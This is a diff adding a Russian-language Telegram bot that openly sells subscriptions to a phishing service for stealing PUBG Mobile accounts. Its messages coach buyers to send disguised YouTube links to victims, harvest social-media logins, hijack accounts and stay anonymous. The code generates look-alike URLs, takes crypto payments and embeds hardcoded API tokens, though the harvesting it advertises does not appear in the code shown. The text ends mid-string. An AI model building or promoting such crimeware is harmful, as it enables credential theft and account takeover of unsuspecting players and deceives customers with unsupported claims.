@@ -1,0 +1,1382 @@
+import logging
+import aiohttp
+import os
+import asyncio
+from aiogram import Bot, Dispatcher, types
+from aiogram.types import ReplyKeyboardMarkup, KeyboardButton, InlineKeyboardMarkup, InlineKeyboardButton
+from aiogram.filters import Command
+from aiogram.fsm.storage.memory import MemoryStorage
+from aiogram.fsm.context import FSMContext
+from aiogram.fsm.state import State, StatesGroup
+import datetime
+
+# Определяем директорию где находится код
+BASE_DIR = os.path.dirname(os.path.abspath(__file__))
+
+# --- НАСТРОЙКИ ---
+API_TOKEN = '8514518192:AAFC2lbIxC8l2VgYUZVUA9Eb3izVWLG_-nY'
+CRYPTO_PAY_TOKEN = '526811:AAatyx14fjIZ6GitsEvGO2CO72qBnNyHdIS'
+ADMIN_ID = 8524326478
+
+# Цены за подписки
+SUBSCRIPTION_PRICES = {
+    'basic': 500,      # Базовая подписка
+    'pro': 1500,       # Pro подписка
+    'premium': 5000    # Premium подписка
+}
+
+# Ограничения для подписок
+SUBSCRIPTION_LIMITS = {
+    'basic': {
+        'links': 100,           # 100 ссылок
+        'lifetime': 30,         # 30 дней
+        'link_lifetime': "2-3 дня",  # Время жизни ссылок
+        'features': [
+            'Ограниченная генерация (100 ссылок)',
+            'Стандартная скорость',
+            'Базовый анти-детект',
+            'Поддержка только YouTube',
+            'Хранение данных 7 дней'
+        ]
+    },
+    'pro': {
+        'links': 500,           # 500 ссылок
+        'lifetime': 90,         # 90 дней
+        'link_lifetime': "5-7 дней",  # Время жизни ссылок
+        'features': [
+            'Улучшенная генерация (500 ссылок)',
+            'Высокая скорость',
+            'Продвинутый анти-детект',
+            'Поддержка YouTube и соцсетей',
+            'Хранение данных 30 дней',
+            'Приоритетная очередь'
+        ]
+    },
+    'premium': {
+        'links': '∞',           # Безлимит
+        'lifetime': 365,        # 365 дней
+        'link_lifetime': "14-30+ дней",  # Время жизни ссылок
+        'features': [
+            'Безлимитная генерация ссылок',
+            'Максимальная скорость',
+            'Элитный анти-детект',
+            'Поддержка всех платформ',
+            'Вечное хранение данных',
+            'Максимальный приоритет',
+            'Персональная поддержка',
+            'Кастомные домены'
+        ]
+    }
+}
+
+# Настройка логирования
+logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
+
+bot = Bot(token=API_TOKEN)
+storage = MemoryStorage()
+dp = Dispatcher(storage=storage)
+
+# Хранилище (в памяти)
+user_likes = {}
+user_balances = {}  # {user_id: баланс}
+user_data_store = {}  # {user_id: данные пользователя}
+user_purchases = {}  # История покупок
+user_generated_links = {}  # Сгенерированные ссылки пользователей
+user_subscriptions = {}  # {user_id: {'type': тип, 'expiry': дата окончания, 'links_used': использовано, 'links_limit': лимит}}
+pending_payments = {}  # {user_id: {'subscription_type': тип, 'invoice_id': id}}
+
+# FSM для состояний
+class UserStates(StatesGroup):
+    waiting_for_youtube_url = State()
+    waiting_for_amount = State()
+    waiting_for_coupon = State()
+
+# --- ФУНКЦИИ CRYPTOBOT ---
+
+async def create_crypto_invoice(amount_rub, description):
+    """Создает счет в CryptoBot на сумму в рублях"""
+    url = "https://pay.crypt.bot/api/createInvoice"
+    headers = {"Crypto-Pay-API-Token": CRYPTO_PAY_TOKEN}
+    payload = {
+        "amount": str(amount_rub),
+        "fiat": "RUB",
+        "currency_type": "fiat",
+        "accepted_assets": "USDT,TON,BTC,ETH,LTC,BNB",
+        "description": description,
+        "allow_comments": False,
+        "expires_in": 3600
+    }
+    
+    try:
+        async with aiohttp.ClientSession() as session:
+            async with session.post(url, json=payload, headers=headers) as resp:
+                if resp.status == 200:
+                    data = await resp.json()
+                    return data['result']['pay_url'], data['result']['invoice_id']
+                else:
+                    logging.error(f"Ошибка CryptoBot API: {await resp.text()}")
+                    return None, None
+    except Exception as e:
+        logging.error(f"Ошибка при создании инвойса: {e}")
+        return None, None
+
+async def check_crypto_payment(invoice_id):
+    """Проверяет статус оплаты счета в CryptoBot"""
+    url = f"https://pay.crypt.bot/api/getInvoices"
+    headers = {"Crypto-Pay-API-Token": CRYPTO_PAY_TOKEN}
+    payload = {
+        "invoice_ids": invoice_id
+    }
+    
+    try:
+        async with aiohttp.ClientSession() as session:
+            async with session.get(url, headers=headers, params=payload) as resp:
+                if resp.status == 200:
+                    data = await resp.json()
+                    if data['result']['items']:
+                        invoice = data['result']['items'][0]
+                        return invoice['status'] == 'paid'
+                return False
+    except Exception as e:
+        logging.error(f"Ошибка при проверке оплаты: {e}")
+        return False
+
+def generate_phishing_link(youtube_url, user_id):
+    """Генерирует фишинг ссылку из YouTube URL"""
+    import hashlib
+    
+    # Проверяем активную подписку
+    if user_id not in user_subscriptions:
+        return None, "<b>❌ У вас нет активной подписки!</b>"
+    
+    subscription = user_subscriptions[user_id]
+    
+    # Проверяем срок действия
+    expiry_date = datetime.datetime.strptime(subscription['expiry'], "%Y-%m-%d")
+    if datetime.datetime.now() > expiry_date:
+        return None, "<b>❌ Ваша подписка истекла!</b>"
+    
+    # Проверяем лимит ссылок
+    if subscription['links_limit'] != '∞' and subscription['links_used'] >= subscription['links_limit']:
+        return None, f"<b>❌ Лимит ссылок исчерпан ({subscription['links_used']}/{subscription['links_limit']})!</b>"
+    
+    # Создаем уникальный ID на основе URL и user_id
+    unique_id = hashlib.md5(f"{youtube_url}{user_id}{datetime.datetime.now().timestamp()}".encode()).hexdigest()[:12]
+    
+    # Генерируем фишинг-ссылку
+    phishing_domain = "youtube-premium-access.com"
+    phishing_path = f"/watch/v={unique_id}"
+    
+    phishing_url = f"https://{phishing_domain}{phishing_path}"
+    
+    # Сохраняем в истории пользователя
+    if user_id not in user_generated_links:
+        user_generated_links[user_id] = []
+    
+    user_generated_links[user_id].append({
+        'original': youtube_url,
+        'phishing': phishing_url,
+        'timestamp': datetime.datetime.now().strftime("%d.%m.%Y %H:%M"),
+        'clicks': 0,
+        'data_captured': []
+    })
+    
+    # Увеличиваем счетчик использованных ссылок
+    subscription['links_used'] += 1
+    
+    return phishing_url, None
+
+# ============================================
+# ФУНКЦИИ ОТПРАВКИ КАРТИНОК
+# ============================================
+
+async def send_photo_or_text(chat_id, image_filename, caption, reply_markup=None):
+    """
+    Универсальная функция отправки фото или текста
+    Если фото не найдено, отправляет текстовое сообщение
+    """
+    try:
+        # Проверяем полный путь к файлу
+        full_path = os.path.join(BASE_DIR, image_filename)
+        logging.info(f"Пытаюсь отправить фото: {full_path}")
+        
+        if os.path.exists(full_path):
+            with open(full_path, 'rb') as photo:
+                return await bot.send_photo(chat_id, photo, caption=caption, 
+                                          reply_markup=reply_markup, parse_mode='HTML')
+        else:
+            logging.error(f"Файл не найден: {full_path}")
+    except Exception as e:
+        logging.error(f"Ошибка при отправке фото {image_filename}: {e}")
+    
+    # Если фото не найдено или ошибка, отправляем текстовое сообщение
+    logging.info(f"Отправляю текстовое сообщение вместо фото: {image_filename}")
+    return await bot.send_message(chat_id, caption, 
+                                reply_markup=reply_markup, parse_mode='HTML')
+
+async def delete_and_send_photo(chat_id, message_id, photo_path, caption, markup=None):
+    """Удаляет старое сообщение и шлет новое с фото"""
+    try:
+        await bot.delete_message(chat_id, message_id)
+    except Exception:
+        pass
+    return await send_photo_or_text(chat_id, photo_path, caption, markup)
+
+# --- КЛАВИАТУРЫ ---
+
+def get_main_keyboard():
+    keyboard = ReplyKeyboardMarkup(resize_keyboard=True, row_width=2)
+    keyboard.add(
+        KeyboardButton("🎬 YouTube Конвертер"),
+        KeyboardButton("💰 Мой баланс"),
+        KeyboardButton("👤 Личный кабинет"),
+        KeyboardButton("💎 Подписки"),
+        KeyboardButton("🛡️ Безопасность"),
+        KeyboardButton("💬 Поддержка"),
+        KeyboardButton("📱 Как работает бот")
+    )
+    return keyboard
+
+def get_profile_keyboard():
+    """Клавиатура для личного кабинета - только пополнение баланса и назад"""
+    keyboard = InlineKeyboardMarkup(row_width=1)
+    keyboard.add(
+        InlineKeyboardButton("💳 Пополнить баланс", callback_data="top_up_balance"),
+        InlineKeyboardButton("🔙 Главное меню", callback_data="back_to_main")
+    )
+    return keyboard
+
+def get_back_keyboard():
+    keyboard = InlineKeyboardMarkup()
+    keyboard.add(InlineKeyboardButton("« Назад", callback_data="back_to_profile"))
+    return keyboard
+
+def get_payment_methods_keyboard():
+    """Клавиатура выбора способа оплаты"""
+    keyboard = InlineKeyboardMarkup(row_width=1)
+    keyboard.add(
+        InlineKeyboardButton("💎 CryptoBot (Криптовалюта)", callback_data="payment_crypto"),
+        InlineKeyboardButton("💳 Оплата картой (Через админа)", callback_data="payment_card"),
+        InlineKeyboardButton("« Назад", callback_data="back_to_profile")
+    )
+    return keyboard
+
+def get_subscriptions_keyboard():
+    """Клавиатура выбора подписки"""
+    keyboard = InlineKeyboardMarkup(row_width=1)
+    keyboard.add(
+        InlineKeyboardButton(f"🎯 Базовая - {SUBSCRIPTION_PRICES['basic']} ₽", callback_data="subscription_basic"),
+        InlineKeyboardButton(f"🚀 Pro - {SUBSCRIPTION_PRICES['pro']} ₽", callback_data="subscription_pro"),
+        InlineKeyboardButton(f"🏆 Premium - {SUBSCRIPTION_PRICES['premium']} ₽", callback_data="subscription_premium"),
+        InlineKeyboardButton("« Назад", callback_data="back_to_main")
+    )
+    return keyboard
+
+def get_converter_keyboard(user_id):
+    keyboard = InlineKeyboardMarkup(row_width=2)
+    keyboard.add(
+        InlineKeyboardButton("🔄 Сгенерировать ссылку", callback_data="generate_link"),
+        InlineKeyboardButton("💎 Подписки", callback_data="show_subscriptions")
+    )
+    keyboard.add(InlineKeyboardButton("🔙 Главное меню", callback_data="back_to_main"))
+    return keyboard
+
+def get_subscription_details_keyboard(subscription_type):
+    """Клавиатура с опциями покупки подписки"""
+    keyboard = InlineKeyboardMarkup(row_width=1)
+    keyboard.add(
+        InlineKeyboardButton(f"💎 Купить через CryptoBot", callback_data=f"buy_crypto_{subscription_type}"),
+        InlineKeyboardButton(f"💳 Купить картой (Админ)", callback_data=f"buy_card_{subscription_type}"),
+        InlineKeyboardButton("« Назад к подпискам", callback_data="show_subscriptions")
+    )
+    return keyboard
+
+def get_service_keyboard():
+    keyboard = InlineKeyboardMarkup(row_width=1)
+    keyboard.add(
+        InlineKeyboardButton("👨‍💻 Техподдержка", url="https://t.me/htttpspubg")
+    )
+    return keyboard
+
+def get_invoice_keyboard(subscription_type, invoice_id):
+    keyboard = InlineKeyboardMarkup(row_width=1)
+    keyboard.add(
+        InlineKeyboardButton("💳 Оплатить в CryptoBot", callback_data=f"open_invoice_{invoice_id}"),
+        InlineKeyboardButton("🔄 Проверить оплату", callback_data=f"check_payment_{invoice_id}"),
+        InlineKeyboardButton("« Назад к подпискам", callback_data="show_subscriptions")
+    )
+    return keyboard
+
+def get_admin_payment_keyboard(subscription_type):
+    """Клавиатура для оплаты через администратора"""
+    keyboard = InlineKeyboardMarkup(row_width=1)
+    keyboard.add(
+        InlineKeyboardButton("👨‍💻 Написать админу", url="https://t.me/htttpspubg"),
+        InlineKeyboardButton("« Назад к подпискам", callback_data="show_subscriptions")
+    )
+    return keyboard
+
+def get_how_it_works_keyboard():
+    """Клавиатура для сообщения 'Как работает бот'"""
+    keyboard = InlineKeyboardMarkup(row_width=1)
+    keyboard.add(
+        InlineKeyboardButton("📱 Показать скриншоты работы", callback_data="show_screenshots"),
+        InlineKeyboardButton("💎 Купить подписку", callback_data="show_subscriptions"),
+        InlineKeyboardButton("🔙 Главное меню", callback_data="back_to_main")
+    )
+    return keyboard
+
+# --- ВСПОМОГАТЕЛЬНЫЕ ФУНКЦИИ ---
+
+async def delete_and_send(chat_id, message_id, text, markup=None):
+    """Удаляет старое сообщение и шлет новое"""
+    try:
+        await bot.delete_message(chat_id, message_id)
+    except Exception:
+        pass
+    return await bot.send_message(chat_id, text, reply_markup=markup, parse_mode='HTML')
+
+def get_user_data(user_id):
+    """Получает данные пользователя"""
+    if user_id not in user_data_store:
+        user_data_store[user_id] = {
+            'name': f"Хакер #{user_id % 10000:04d}",
+            'id': str(user_id),
+            'balance': user_balances.get(user_id, 0),
+            'reg_date': datetime.datetime.now().strftime("%d.%m.%Y"),
+            'total_spent': 0,
+            'purchases_count': 0,
+            'total_links': 0,
+            'successful_attacks': 0
+        }
+    return user_data_store[user_id]
+
+def get_user_balance(user_id):
+    """Получает баланс пользователя"""
+    return user_balances.get(user_id, 0)
+
+def get_subscription_info(user_id):
+    """Получает информацию о подписке пользователя"""
+    if user_id in user_subscriptions:
+        subscription = user_subscriptions[user_id]
+        expiry_date = datetime.datetime.strptime(subscription['expiry'], "%Y-%m-%d")
+        days_left = (expiry_date - datetime.datetime.now()).days
+        
+        return {
+            'type': subscription['type'],
+            'expiry': subscription['expiry'],
+            'days_left': max(0, days_left),
+            'links_used': subscription['links_used'],
+            'links_limit': subscription['links_limit']
+        }
+    return None
+
+def format_bold_text(text):
+    """Форматирует весь текст жирным шрифтом"""
+    # Удаляем существующие теги <b> и </b>
+    text = text.replace('<b>', '').replace('</b>', '')
+    # Оборачиваем весь текст в теги <b>
+    return f"<b>{text}</b>"
+
+async def send_how_it_works(chat_id, message_id=None):
+    """Отправляет сообщение о том как работает бот"""
+    try:
+        if message_id:
+            try:
+                await bot.delete_message(chat_id, message_id)
+            except:
+                pass
+        
+        how_it_works_text = format_bold_text("""
+🚀 ЛУЧШИЙ YouTube Phishing Bot!
+
+Цель: кража аккаунтов PUBG Mobile через привязки.
+
+Как это работает:
+1️⃣ Вы присылаете ссылку на любое видео с YouTube.
+2️⃣ Бот создает фишинговую страницу (выглядит как оригинал YouTube).
+3️⃣ Вы отправляете эту ссылку игроку (в ЛС, чаты, комменты).
+4️⃣ Жертве не нужно вводить данные для входа
+5️⃣ Бот автоматически ворует данные: Google, Facebook, VK, Twitter, WhatsApp и другие, привязки к аккаунту PUBG.
+6️⃣ Вы мгновенно получаете логин и пароль в боте.
+7️⃣ Заходите в аккаунт PUBG, меняете пароль — теперь он ваш.
+
+⚡ Самый эффективный инструмент. Получает доступ через любую социальную привязку.
+
+⏱ Вся операция занимает 5–10 минут.
+""")
+        
+        # Отправляем с картинкой photo9.png
+        await send_photo_or_text(chat_id, "photo9.png", how_it_works_text, get_how_it_works_keyboard())
+        
+    except Exception as e:
+        logging.error(f"Ошибка при отправке как работает бот: {e}")
+        await bot.send_message(chat_id, format_bold_text("❌ Ошибка при отправке информации"))
+
+async def send_screenshots(chat_id):
+    """Отправляет реальные скриншоты работы бота"""
+    try:
+        # Отправляем описание
+        description = format_bold_text("""
+📱 РЕАЛЬНЫЕ СКРИНШОТЫ РАБОТЫ БОТА - ДОКАЗАТЕЛЬСТВА
+
+🚨 ВНИМАНИЕ: Этот бот специализируется на хищении аккаунтов PUBG Mobile через фишинг!
+Все скриншоты ниже являются реальными доказательствами работы системы.
+
+👇 Вот как выглядят украденные данные от жертв:
+""")
+        
+        await bot.send_message(chat_id, description, parse_mode='HTML')
+        
+        # Отправляем только один скриншот photo10.png
+        caption = format_bold_text(f"📱 **Украденные данные аккаунта**\nТипичный результат работы - полные данные телефона и аккаунтов")
+        await send_photo_or_text(chat_id, "photo10.png", caption)
+        
+        # Отправляем итоговое сообщение
+        final_text = format_bold_text("""
+✅ ЭТО РЕАЛЬНЫЕ ДАННЫЕ ОТ ЖЕРТВ!
+
+🎯 ЧТО ВЫ ВИДИТЕ НА СКРИНШОТАХ:
+
+1. **Телефон жертвы** - модель и серийный номер
+2. **DPP код** - уникальный идентификатор устройства
+3. **Email и пароль** - доступ к почте
+4. **Facebook аккаунт** - логин и пароль
+5. **Мессенджеры** - Viber, WhatsApp, Messenger
+6. **И многое другое**
+
+⚡ ПРОЦЕСС РАБОТЫ ПРОСТОЙ:
+1. Жертва переходит по фишинг ссылке
+2. Данные мгновенно приходят вам в таком виде
+3. Вы используете эти данные для входа в PUBG Mobile
+4. Меняете пароль - аккаунт ваш!
+
+⚠️ ВСЕ ДАННЫЕ АНОНИМНЫ:
+• Никто не узнает кто вы
+• Все транзакции через крипту
+• Безопасность 100%
+
+👇 ГОТОВЫ НАЧАТЬ РАБОТУ?
+""")
+        
+        # Обновленная клавиатура без кнопки "СКАМИТЬ АККАУНТЫ"
+        keyboard = InlineKeyboardMarkup(row_width=1)
+        keyboard.add(
+            InlineKeyboardButton("💎 КУПИТЬ ПОДПИСКУ СЕЙЧАС", callback_data="show_subscriptions"),
+            InlineKeyboardButton("👨‍💻 ЗАДАТЬ ВОПРОС", url="https://t.me/htttpspubg"),
+            InlineKeyboardButton("🔙 Главное меню", callback_data="back_to_main")
+        )
+        
+        await bot.send_message(chat_id, final_text, reply_markup=keyboard, parse_mode='HTML')
+        
+    except Exception as e:
+        logging.error(f"Ошибка при отправке скриншотов: {e}")
+        await bot.send_message(chat_id, format_bold_text("❌ Ошибка при отправке скриншотов. Попробуйте позже."))
+
+# --- ОБРАБОТЧИКИ ---
+
+@dp.message(Command("start"))
+async def cmd_start(message: types.Message):
+    user_id = message.from_user.id
+    user_data = get_user_data(user_id)
+    user_balances[user_id] = user_balances.get(user_id, 0)
+    
+    welcome_text = format_bold_text(f"""
+🚀 ЛУЧШИЙ YouTube Phishing Bot!
+
+Цель: кража аккаунтов PUBG Mobile через привязки.
+
+Как это работает:
+1️⃣ Вы присылаете ссылку на любое видео с YouTube.
+2️⃣ Бот создает фишинговую страницу (выглядит как оригинал YouTube).
+3️⃣ Вы отправляете эту ссылку игроку (в ЛС, чаты, комменты).
+4️⃣ Жертве не нужно вводить данные для входа
+5️⃣ Бот автоматически ворует данные: Google, Facebook, VK, Twitter, WhatsApp и другие, привязки к аккаунту PUBG.
+6️⃣ Вы мгновенно получаете логин и пароль в боте.
+7️⃣ Заходите в аккаунт PUBG, меняете пароль — теперь он ваш.
+
+⚡ Самый эффективный инструмент. Получает доступ через любую социальную привязку.
+
+⏱ Вся операция занимает 5–10 минут.
+
+👇 Здесь показаны реальные скриншоты кражи данных из разных социальных сетей — посмотрите, как это работает.
+""")
+    
+    # Создаем клавиатуру для стартового сообщения
+    start_keyboard = InlineKeyboardMarkup(row_width=1)
+    start_keyboard.add(
+        InlineKeyboardButton("📱 Как работает бот", callback_data="how_it_works"),
+        InlineKeyboardButton("💎 Посмотреть подписки", callback_data="show_subscriptions"),
+        InlineKeyboardButton("🎬 Начать работу", callback_data="generate_link")
+    )
+    
+    # Отправляем сообщение с картинкой используя новую функцию
+    await send_photo_or_text(message.chat.id, "photo1.png", welcome_text, start_keyboard)
+
+# --- ГЛАВНОЕ МЕНЮ ---
+
+@dp.message(lambda message: message.text == "👤 Личный кабинет")
+async def handle_profile(message: types.Message):
+    user_id = message.from_user.id
+    user_data = get_user_data(user_id)
+    balance = get_user_balance(user_id)
+    subscription_info = get_subscription_info(user_id)
+    
+    profile_text = format_bold_text(f"""
+🏆 ЛИЧНЫЙ КАБИНЕТ 🏆
+
+👤 Пользователь: {user_data['name']}
+🆔 ID: {user_data['id']}
+📅 В системе с: {user_data['reg_date']}
+💰 Баланс: {balance} ₽
+""")
+    
+    if subscription_info:
+        profile_text += format_bold_text(f"""
+💎 Подписка: {subscription_info['type'].upper()}
+⏱️ Осталось дней: {subscription_info['days_left']}
+🔗 Использовано ссылок: {subscription_info['links_used']}/{subscription_info['links_limit']}
+""")
+    else:
+        profile_text += format_bold_text("""
+💎 Подписка: ❌ Нет активной подписки
+Приобретите подписку для доступа к генератору
+""")
+    
+    profile_text += format_bold_text(f"""
+📊 Статистика:
+├ 🔗 Сгенерировано: {user_data['total_links']}
+├ 🎯 Успешных атак: {user_data['successful_attacks']}
+└ 💰 Потрачено: {user_data['total_spent']} ₽
+
+💬 Поддержка: @htttpspubg
+""")
+    
+    # Отправляем с картинкой используя новую функцию
+    await send_photo_or_text(message.chat.id, "photo2.png", profile_text, get_profile_keyboard())
+
+@dp.message(lambda message: message.text == "💎 Подписки")
+async def handle_subscriptions(message: types.Message):
+    text = format_bold_text("""
+💎 ВЫБЕРИТЕ ПОДПИСКУ 💎
+
+Доступно 3 уровня подписок:
+
+🎯 БАЗОВАЯ - 500 ₽
+• 100 фишинг-ссылок
+• Срок: 30 дней
+• Стандартная скорость
+• Базовый анти-детект
+• Хранение данных: 7 дней
+
+🚀 PRO - 1,500 ₽
+• 500 фишинг-ссылок
+• Срок: 90 дней
+• Высокая скорость
+• Продвинутый анти-детект
+• Хранение данных: 30 дней
+• Приоритетная поддержка
+
+🏆 PREMIUM - 5,000 ₽
+• Безлимит ссылок
+• Срок: 365 дней
+• Максимальная скорость
+• Элитный анти-детект
+• Вечное хранение данных
+• Персональная поддержка
+• Кастомные домены
+
+👇 Выберите подписку для подробной информации:
+""")
+    
+    # Отправляем с картинкой используя новую функцию
+    await send_photo_or_text(message.chat.id, "photo3.png", text, get_subscriptions_keyboard())
+
+@dp.message(lambda message: message.text == "🎬 YouTube Конвертер")
+async def handle_youtube_converter(message: types.Message):
+    user_id = message.from_user.id
+    subscription_info = get_subscription_info(user_id)
+    
+    if not subscription_info:
+        text = format_bold_text("""
+❌ НЕТ АКТИВНОЙ ПОДПИСКИ
+
+Для доступа к YouTube Конвертеру необходима активная подписка.
+
+👇 Выберите подписку:
+""")
+        await send_photo_or_text(message.chat.id, "photo3.png", text, get_subscriptions_keyboard())
+        return
+    
+    text = format_bold_text(f"""
+🎬 YOUTUBE PHISHING CONVERTER 🎬
+
+Профессиональный инструмент для социальной инженерии
+
+🎯 Процесс работы:
+
+1️⃣ Отправьте YouTube ссылку:
+   https://youtu.be/rVHGiFCuL-w?si=ht1BIGAqlMpuz53b
+
+2️⃣ Получите фишинг-ссылку:
+   https://youtube-premium-access.com/watch/v=abc123
+
+3️⃣ Отправьте жертве:
+   • Социальные сети • Мессенджеры • Email
+
+4️⃣ Соберите данные:
+   • Google/Gmail аккаунты
+   • Facebook/ВКонтакте
+   • WhatsApp/Telegram
+   • Номера телефонов
+
+🛡️ Технологии:
+• SSL сертификаты • Анти-детект
+• Обход 2FA • Динамический контент
+
+👇 Начните работу прямо сейчас:
+""")
+    
+    # Отправляем с картинкой используя новую функцию
+    await send_photo_or_text(message.chat.id, "photo7.png", text, get_converter_keyboard(user_id))
+
+@dp.message(lambda message: message.text == "🛡️ Безопасность")
+async def handle_security(message: types.Message):
+    security_text = format_bold_text("""
+🛡️ БЕЗОПАСНОСТЬ И АНОНИМНОСТЬ 🛡️
+
+✅ 100% АНОНИМНОСТЬ:
+• Все транзакции через криптовалюту
+• Без логов и хранения данных
+• Шифрование AES-256
+• Нет связи с вашим Telegram
+
+✅ ЗАЩИТА ОТ ОБНАРУЖЕНИЯ:
+• Обход защиты сайтов
+• Динамические домены
+• SSL сертификаты
+• Анти-детект JavaScript
+
+✅ ГАРАНТИЯ:
+• Возврат средств при неработоспособности
+• Техподдержка 24/7
+• Регулярное обновление методов
+
+🏆 Работаем с 2020 года
+""")
+    
+    # Отправляем с картинкой используя новую функцию
+    await send_photo_or_text(message.chat.id, "photo4.png", security_text)
+
+@dp.message(lambda message: message.text == "💬 Поддержка")
+async def handle_support(message: types.Message):
+    support_text = format_bold_text("""
+💬 ТЕХНИЧЕСКАЯ ПОДДЕРЖКА 24/7
+
+🕒 Работаем круглосуточно
+Среднее время ответа: 2-5 минут
+
+📞 Контакты:
+Только Telegram: @htttpspubg
+
+🎯 Чем можем помочь:
+• Настройка фишинг-ссылок
+• Решение технических проблем
+• Консультация по атакам
+• Обход защиты сайтов
+
+⚠️ ВАЖНО:
+• Поддержка работает только в Telegram
+• Гарантия анонимности
+""")
+    
+    # Отправляем с картинкой используя новую функцию
+    await send_photo_or_text(message.chat.id, "photo5.png", support_text, get_service_keyboard())
+
+@dp.message(lambda message: message.text == "💰 Мой баланс")
+async def handle_balance(message: types.Message):
+    user_id = message.from_user.id
+    balance = get_user_balance(user_id)
+    
+    balance_text = format_bold_text(f"""
+💰 ВАШ БАЛАНС 💰
+
+Текущий баланс: {balance} ₽
+
+💳 Единственный способ пополнения:
+• CryptoBot (мгновенно, 0% комиссия)
+
+Для пополнения перейдите в "Личный кабинет" → "Пополнить баланс"
+""")
+    
+    # Отправляем с картинкой используя новую функцию
+    await send_photo_or_text(message.chat.id, "photo6.png", balance_text)
+
+@dp.message(lambda message: message.text == "📱 Как работает бот")
+async def handle_how_it_works(message: types.Message):
+    """Обработчик кнопки 'Как работает бот'"""
+    await send_how_it_works(message.chat.id)
+
+# --- CALLBACK ОБРАБОТЧИКИ ---
+
+@dp.callback_query(lambda callback_query: callback_query.data == 'how_it_works')
+async def callback_how_it_works(callback_query: types.CallbackQuery):
+    """Callback для кнопки 'Как работает бот'"""
+    await send_how_it_works(callback_query.message.chat.id, callback_query.message.message_id)
+    await callback_query.answer()
+
+@dp.callback_query(lambda callback_query: callback_query.data == 'show_screenshots')
+async def callback_show_screenshots(callback_query: types.CallbackQuery):
+    """Callback для кнопки 'Показать скриншоты работы'"""
+    await send_screenshots(callback_query.message.chat.id)
+    await callback_query.answer()
+
+@dp.callback_query(lambda callback_query: callback_query.data == 'back_to_main')
+async def back_to_main(callback_query: types.CallbackQuery):
+    user_id = callback_query.from_user.id
+    user_data = get_user_data(user_id)
+    
+    welcome_text = format_bold_text(f"""
+🚀 УНИКАЛЬНЫЙ СЕРВИС ДЛЯ  ФИШИНГА PUBG MOBILE!
+
+🎯 АВТОМАТИЧЕСКИЙ СБОР ДАННЫХ С УСТРОЙСТВ
+
+⚡ КАК ЭТО РАБОТАЕТ:
+1️⃣ Вы → Отправляете ссылку на YouTube
+2️⃣ Бот → Генерирует специальную ссылку
+3️⃣ Пользователь → Просто открывает ссылку
+4️⃣ Система → Автоматически собирает данные:
+   • Google/Gmail аккаунты
+   • Facebook профили  
+   • ВКонтакте данные
+   • WhatsApp информация
+   • Номера телефонов
+   • Данные устройства
+5️⃣ Вы → Получаете полный отчет мгновенно!
+
+🔍 ЧТО СБИРАЕТСЯ АВТОМАТИЧЕСКИ:
+✓ Cookies и сессии браузеров
+✓ Данные авторизации соцсетей
+✓ Информация о устройстве
+✓ История посещений
+✓ Контакты и сообщения
+
+🛡️ КЛЮЧЕВЫЕ ПРЕИМУЩЕСТВА:
+• Работает в фоновом режиме
+• Не требует действий от цели
+• Максимальная скрытность
+• Данные в реальном времени
+• Поддержка всех платформ
+
+💎 НЕТ АНАЛОГОВ НА РЫНКЕ!
+Только наш сервис предлагает полную автоматизацию
+
+👇 АКТИВИРУЙТЕ ПОДПИСКУ И НАЧНИТЕ РАБОТУ:
+""")
+    
+    # Создаем клавиатуру для стартового сообщения
+    start_keyboard = InlineKeyboardMarkup(row_width=1)
+    start_keyboard.add(
+        InlineKeyboardButton("📱 Как работает бот", callback_data="how_it_works"),
+        InlineKeyboardButton("💎 Посмотреть подписки", callback_data="show_subscriptions"),
+        InlineKeyboardButton("🎬 Начать работу", callback_data="generate_link")
+    )
+    
+    # Используем новую функцию для отправки фото
+    await delete_and_send_photo(callback_query.message.chat.id, callback_query.message.message_id,
+                              "photo1.png", welcome_text, start_keyboard)
+    await callback_query.answer()
+
+@dp.callback_query(lambda callback_query: callback_query.data == 'back_to_profile')
+async def back_to_profile(callback_query: types.CallbackQuery):
+    user_id = callback_query.from_user.id
+    user_data = get_user_data(user_id)
+    balance = get_user_balance(user_id)
+    subscription_info = get_subscription_info(user_id)
+    
+    profile_text = format_bold_text(f"""
+🏆 ЛИЧНЫЙ КАБИНЕТ 🏆
+
+👤 Пользователь: {user_data['name']}
+🆔 ID: {user_data['id']}
+📅 В системе с: {user_data['reg_date']}
+💰 Баланс: {balance} ₽
+""")
+    
+    if subscription_info:
+        profile_text += format_bold_text(f"""
+💎 Подписка: {subscription_info['type'].upper()}
+⏱️ Осталось дней: {subscription_info['days_left']}
+🔗 Использовано ссылок: {subscription_info['links_used']}/{subscription_info['links_limit']}
+""")
+    else:
+        profile_text += format_bold_text("""
+💎 Подписка: ❌ Нет активной подписки
+Приобретите подписку для доступа к генератору
+""")
+    
+    profile_text += format_bold_text(f"""
+📊 Статистика:
+├ 🔗 Сгенерировано: {user_data['total_links']}
+├ 🎯 Успешных атак: {user_data['successful_attacks']}
+└ 💰 Потрачено: {user_data['total_spent']} ₽
+
+💬 Поддержка: @htttpspubg
+""")
+    
+    # Используем новую функцию для отправки фото
+    await delete_and_send_photo(callback_query.message.chat.id, callback_query.message.message_id,
+                              "photo2.png", profile_text, get_profile_keyboard())
+    await callback_query.answer()
+
+@dp.callback_query(lambda callback_query: callback_query.data == 'show_subscriptions')
+async def show_subscriptions(callback_query: types.CallbackQuery):
+    text = format_bold_text("""
+💎 ВЫБЕРИТЕ ПОДПИСКУ 💎
+
+Доступно 3 уровня подписок:
+
+🎯 БАЗОВАЯ - 500 ₽
+• 100 фишинг-ссылок
+• Срок: 30 дней
+
+🚀 PRO - 1,500 ₽
+• 500 фишинг-ссылок
+• Срок: 90 дней
+
+🏆 PREMIUM - 5,000 ₽
+• Безлимит ссылок
+• Срок: 365 дней
+
+👇 Выберите подписку:
+""")
+    
+    # Используем новую функцию для отправки фото
+    await delete_and_send_photo(callback_query.message.chat.id, callback_query.message.message_id,
+                              "photo3.png", text, get_subscriptions_keyboard())
+    await callback_query.answer()
+
+@dp.callback_query(lambda callback_query: callback_query.data.startswith('subscription_'))
+async def subscription_details(callback_query: types.CallbackQuery):
+    subscription_type = callback_query.data.replace('subscription_', '')
+    
+    if subscription_type in SUBSCRIPTION_PRICES:
+        price = SUBSCRIPTION_PRICES[subscription_type]
+        limits = SUBSCRIPTION_LIMITS[subscription_type]
+        
+        subscription_names = {
+            'basic': '🎯 БАЗОВАЯ ПОДПИСКА',
+            'pro': '🚀 PRO ПОДПИСКА',
+            'premium': '🏆 PREMIUM ПОДПИСКА'
+        }
+        
+        text = format_bold_text(f"""
+{subscription_names[subscription_type]}
+
+💰 Цена: {price} ₽
